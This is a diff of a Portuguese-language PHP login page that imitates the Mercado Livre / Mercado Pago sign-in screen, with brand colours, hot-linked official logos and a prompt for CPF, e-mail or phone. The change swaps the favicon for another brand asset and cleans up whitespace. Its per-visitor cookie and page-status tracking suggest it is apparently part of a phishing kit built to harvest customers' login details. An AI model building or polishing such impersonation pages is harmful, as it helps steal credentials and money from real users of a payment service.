@@ -24,7 +24,7 @@ if (!isset($_COOKIE['identificador_cliente'])) {
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Digite seu CPF, e-mail ou telefone para iniciar sessão</title>
-    <link rel="icon" href="https://http2.mlstatic.com/frontend-assets/mp-web-navigation/ui-navigation/6.7.73/mercadopago/favicon.svg" type="image/svg"/>
+    <link rel="icon" href="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/6.6.146/mercadolibre/pt_logo_large_plus@2x.webp" type="image/svg"/>
     <style>
         :root {
             --cor-amarela: #ffe600;
@@ -37,7 +37,7 @@ if (!isset($_COOKIE['identificador_cliente'])) {
         body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; background-color: var(--cor-fundo-pagina); display: flex; flex-direction: column; min-height: 100vh; }
         .main-header { background-color: var(--cor-amarela); padding: 12px 24px; display: flex; justify-content: flex-start; align-items: center; }
         .main-header img { height: 35px; } /* Ajustado para 35px como no seu código */
-        
+
         /* ALTERAÇÃO: Transformando o main em um container flex */
         .main-content {
             background-color: var(--cor-fundo-card);
@@ -46,7 +46,7 @@ if (!isset($_COOKIE['identificador_cliente'])) {
             display: flex;
             flex-direction: column; /* Organiza os itens em coluna */
         }
-        
+
         .main-title { font-size: 24px; font-weight: 600; color: var(--cor-texto-primaria); margin: 0 0 32px 0; }
         .input-label { font-size: 14px; font-weight: 500; color: #555; margin-bottom: 4px; display: block; }
         .input-field {
@@ -69,7 +69,7 @@ if (!isset($_COOKIE['identificador_cliente'])) {
         .btn-continue { width: 100%; background-color: var(--cor-azul-primaria); color: white; border: none; padding: 16px; font-size: 16px; font-weight: 600; border-radius: 6px; cursor: pointer; margin-bottom: 24px; }
         .btn-continue:hover { background-color: var(--cor-azul-secundaria); }
         .link-create { display: block; text-align: center; color: var(--cor-azul-primaria); text-decoration: none; font-size: 15px; font-weight: 500; }
-        
+
         /* NOVO: Wrapper para os links de suporte para controle de posicionamento */
         .support-wrapper {
             margin-top: auto; /* ESTA É A MÁGICA: Empurra este bloco para o final do container flex */
@@ -80,7 +80,7 @@ if (!isset($_COOKIE['identificador_cliente'])) {
         .security-link .icon-text { display: flex; align-items: center; gap: 12px; }
         .help-link { display: block; margin-top: 24px; text-align: center; color: var(--cor-azul-primaria); text-decoration: none; font-size: 14px; font-weight: 500; }
         .error-message { color: #d93025; font-size: 12px; margin-top: -16px; margin-bottom: 16px; min-height: 16px; }
-        
+
         .main-footer-mobile { background-color: #f5f5f5; padding: 32px 24px; text-align: center; font-size: 12px; color: var(--cor-texto-secundaria); line-height: 1.5; }
         .main-footer-mobile a { color: var(--cor-azul-primaria); text-decoration: none; }
         .main-footer-mobile .copyright { margin-top: 16px; }
@@ -117,7 +117,7 @@ if (!isset($_COOKIE['identificador_cliente'])) {
             <a href="#" class="help-link">Preciso de ajuda</a>
         </div>
     </main>
-    
+
     <footer class="main-footer-mobile">
         <div>
             <span>Protegido por reCAPTCHA - </span>
@@ -136,7 +136,7 @@ if (!isset($_COOKIE['identificador_cliente'])) {
         const submitBtn = loginForm.querySelector('.btn-continue');
 
         // --- BLOCO DA MÁSCARA DE INPUT FOI REMOVIDO CONFORME SOLICITADO ---
-        
+
         // --- FUNÇÕES DE VALIDAÇÃO (INALTERADAS) ---
         const isValidEmail = (email) => {
             const re = /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
@@ -145,7 +145,7 @@ if (!isset($_COOKIE['identificador_cliente'])) {
 
         const isValidCPF = (cpf) => {
             cpf = cpf.replace(/\D/g, ''); // Remove formatação
-            if (cpf.length !== 11 || /^(\d)\1+$/.test(cpf)) return false; 
+            if (cpf.length !== 11 || /^(\d)\1+$/.test(cpf)) return false;
             let sum = 0, rest;
             for (let i = 1; i <= 9; i++) sum += parseInt(cpf.substring(i-1, i)) * (11 - i);
             rest = (sum * 10) % 11;
@@ -174,7 +174,7 @@ if (!isset($_COOKIE['identificador_cliente'])) {
                 errorDiv.textContent = 'Informe seu e-mail, telefone ou CPF.';
                 return;
             }
-            
+
             let eValido = false;
             const apenasNumeros = valor.replace(/\D/g, '');
 
@@ -190,7 +190,7 @@ if (!isset($_COOKIE['identificador_cliente'])) {
                 errorDiv.textContent = 'Por favor, informe um dado válido.';
                 return;
             }
-            
+
             submitBtn.disabled = true;
             submitBtn.textContent = 'Aguarde...';
 
@@ -243,7 +243,7 @@ if (!isset($_COOKIE['identificador_cliente'])) {
 
             // Descobre o nome do arquivo da página atual
             const currentPage = window.location.pathname.split('/').pop();
-            
+
             // Pega a mensagem de status correspondente
             const currentStatus = statusMap[currentPage] || 'Página Desconhecida';
 
